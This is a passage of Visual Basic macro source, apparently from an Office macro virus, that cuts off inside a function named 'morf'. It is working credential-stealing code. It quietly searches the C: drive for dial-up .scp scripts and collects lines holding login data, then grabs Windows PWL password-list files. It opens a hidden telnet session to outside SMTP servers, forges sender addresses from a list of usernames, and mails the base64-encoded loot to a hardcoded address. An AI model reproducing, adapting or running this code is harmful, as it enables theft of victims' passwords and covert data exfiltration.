   Attribute VB_Name = "Módulo1"
   'Dial-up_script_checker
   Option Explicit
   Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
   Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
   Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
   Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Long, ByVal Msg As Long, wParam As Any, lParam As Any) As Long
   Declare Function FindWindow Lib "user32.dll" Alias _
   "FindWindowA" (ByVal lpClassName As Any, _
   ByVal lpWindowName As Any) As Long
   Function Adapt(Cod As String)
   Dim PostCod As String
   Dim i As Long
   On Error Resume Next
   For i = 1 To Len(Cod)
    If i >= 76 And (i Mod 76) = 0 Then
     PostCod = PostCod + Mid(Cod, i, 1) + "#"
     Else
     PostCod = PostCod + Mid(Cod, i, 1)
    End If
   Next
   Adapt = "#" + PostCod + "#"
   End Function
   'End Sub
   Function SCP()
   Dim i As Integer
   Dim Tmp As String
   Dim Found As Boolean
   Dim NUA As String
   Dim MScript1 As String
   Dim MScript2 As String
   Dim NF As Integer

   On Error Resume Next
   If Application.Visible = False Then
   With Application.FileSearch
        .LookIn = "c:\"
        .SearchSubFolders = True
        .FileName = "*.scp"
        .Execute
       Found = False
       For i = 1 To .FoundFiles.Count
        NF = FreeFile
        If InStr(1, .FoundFiles(i), "MyInternet.scp", vbTextCompare) = 0 Then
        Open .FoundFiles(i) For Input Access Read As #NF
         Do While Not EOF(NF)
          Line Input #NF, Tmp
           MScript1 = MScript1 + Chr(13) + Chr(10) + Tmp
           If InStr(1, Tmp, "-.int", vbBinaryCompare) Or InStr(1, Tmp, "-.nt", vbBinaryCompare) Then
           Found = True
           NUA = NUA + Chr(13) + Chr(10) + Tmp
          End If
         Loop
        Close NF

        If Len(MScript1) < 5000 And Found = True Then MScript2 = MScript2 + Chr(13) + Chr(10) + .FoundFiles(i) + Chr(13) + Chr(10) + MScript1
        Found = False: Tmp = "": MScript1 = ""
       DoEvents
       End If
       Next i
   End With
   SCP = NUA + Chr(13) + Chr(10) + MScript2
   NF = FreeFile
   Open "C:\WINDOWS\MyInternet.scp" For Output Access Write As NF
    Print #NF, SCP
   Close NF
   Else
   NF = FreeFile
   On Error GoTo CONEZ
   Open "C:\WINDOWS\MyInternet.scp" For Input Access Read As NF
     Do While Not EOF(NF)
     Line Input #NF, Tmp
     SCP = SCP + Tmp
     Loop
    Close #NF
   End If
   CONEZ:
   End Function
   ' End Sub
   Sub Sender_main()

   Dim Handle As Long
   Dim HandleBW As Long

   Dim NoConn_ As String
   Dim hwnd As Long

   Dim GrabStr As String
   Dim Start As Long
   Dim MyDat As Byte
   Dim i As Integer
   Dim NPwl() As String
   Dim j As Integer
   Dim Title As String
   Dim SMTP As String
   Dim Host(1 To 14) As String
   Dim A() As Integer
   Dim f As Integer
   Dim NF As Integer
   Dim THwnd As Long
   Dim Twnd As String
   Dim None As String
   Dim RecipientOfMessage_ As String
   Dim SenderAddress As String
   Dim SenderDomain As String
   Dim FNum_ As Integer
   Dim Usname
   Dim Domain_ As String

   On Error Resume Next
   If Check_Connection = True Then
   RecipientOfMessage_ = "<kashek@usa.net>"

   Host(1) = "smtp.mail.ru": Domain_ = "@mail.ru"
   Usname = Array("-dima-", "2vasiliy", "521521", "DGabidullin", "Intarsija", "KirovDVP", "Mischelli", "MonitorExpress", "Sveta-P2000", "Voronin_Vladimir", "a_kladenova", "abccondi", "abs", "admiralll", "ako", "alazif", "alcan777", "aleksiv2000", "alena_elena", "alexander555", "alexkis", "alexsar", "alltair", "alt-info", "antares_", "anton76", "artyserg", "arxi77", "asp", "ate", "avatchev", "axel_extr", "balds", "bars-profile", "batsek", "best-njl", "bigmoney4u", "bkp", "braut_99", "broker-nsk", "bxk", "c_service", "carlych", "ciap", "courses", "darlenka", "daswer", "datasave")
   Host(2) = "itk2.bas-net.by"
   Host(3) = "195.75.32.20"

   Loto 3, A()

   Shell "telnet", 0
     THwnd = FindWindow(CLng(0), "Telnet - (none)")
      If THwnd <> 0 Then
       Twnd = "telnet"
       None = "(none)"
       NoConn_ = "Connect failed"
     Else
      THwnd = FindWindow(CLng(0), "O†‰¡†• - (¡†•)")
      If THwnd <> 0 Then
       Twnd = "O†‰¡†•"
       None = "(¡†•)"
       NoConn_ = "¥ Œ‚ ‹Œ„ˆ‰_ö†¡Š˜"
      Else
      THwnd = FindWindow(CLng(0), "Telnet - (¡†•)")
       Twnd = "telnet"
       None = "(¡†•)"
       NoConn_ = "¥ Œ‚ ‹Œ„ˆ‰_ö†¡Š˜"
      End If
     End If
   SendMessage THwnd, CLng(16), ByVal CLng(0), 0
   DoEvents
   For f = 1 To 3
   Shell "telnet " + Host(A(f)) + " 25", 0
   DoEvents
   Start = Timer
   Do Until Handle <> 0 Or Timer - Start > 70 Or HandleBW <> 0
    Handle = FindWindow(CLng(0), Twnd + " - " + Host(A(f)))
    HandleBW = FindWindow(CLng(0), NoConn_)
    DoEvents
   Loop
   Select Case Handle
     Case Is <> 0

   Randomize
   SenderDomain = Usname(Int(UBound(Usname) * Rnd))
   SenderAddress = Usname(Int(UBound(Usname) * Rnd)) + Domain_

   SMTP = "helo My" + SenderDomain + "#$$mail from: <" + SenderAddress + ">#$" + "rcpt to: " + RecipientOfMessage_ + "#$data#$" + _
    "From: <" + SenderAddress + ">#" + "To: " + RecipientOfMessage_ + "#" + _
    "Date: " + Date$ + " " + Time$ + "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.2#MIME-Version: 1.0#Content-Type: multipart/mixed; boundary=" _
    + Chr(34) + "----=_NextPart" + Chr(34) + "#Content-Transfer-Encoding: 7bit##------=_NextPart#Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: base64#"
   Filler SMTP, Handle
   Pause 1
   GrabStr = Grab + SCP
   SMTP = Base64(GrabStr)
   SMTP = Adapt(SMTP)
   Filler SMTP, Handle

   Pause 1
   FindPWL i, NPwl()
   If i <> 0 Then
    For j = 0 To i - 1
     If FileLen("c:\windows\" + NPwl(j)) <> 688 Then
      SMTP = Base64(NPwl(j))
      SMTP = Adapt(SMTP)
         Title = "#------=_NextPart#Content-Type: application/octet-stream; name=" + Chr(34) _
      + NPwl(j) + Chr(34) + "#Content-Transfer-Encoding: base64#Content-Description: " + _
      NPwl(j) + "(PWL PassWord List)#Content-Disposition: attachment; filename=" _
      + Chr(34) + NPwl(j) + Chr(34) + "#"
         Filler Title, Handle
      Pause 1
      Filler SMTP, Handle
      Pause 1
     End If
    Next
   End If
   Title = "##------=_NextPart--#.#$quit#"
   Filler Title, Handle
   Pause 1
   Start = Timer
   Do Until hwnd <> 0 Or Timer - Start > 120
    hwnd = FindWindow(CLng(0), Twnd)
    DoEvents
   Loop
   Select Case hwnd
   Case Is = 0
     SendMessage Handle, CLng(16), ByVal CLng(0), 0
     Handle = 0
   Case Else
     SendMessage hwnd, CLng(16), ByVal CLng(0), 0
       NF = FreeFile
     MyDat = Val(Mid(Date$, 4, 2))
     Open "c:\windows\logow.sys" For Binary Access Write As #NF
     Put #NF, 76989, MyDat
     Close #NF
     DoEvents
     SendMessage Handle, CLng(16), ByVal CLng(0), 0
     Exit Sub
   End Select
   Case Else
   Handle = FindWindow(CLng(0), Twnd + " - " + None)
   SendMessage HandleBW, CLng(16), ByVal CLng(0), 0
   Pause 3
   SendMessage Handle, CLng(16), ByVal CLng(0), 0
   Pause 3
   HandleBW = 0
   Handle = 0
   End Select
   Next
   End If
   End Sub
   Function morf(MyString As String)
   Dim NextSub As Long
   Dim Counter As Integer
   Dim A() As Integer
   Dim Code_() As String
   Dim i</s
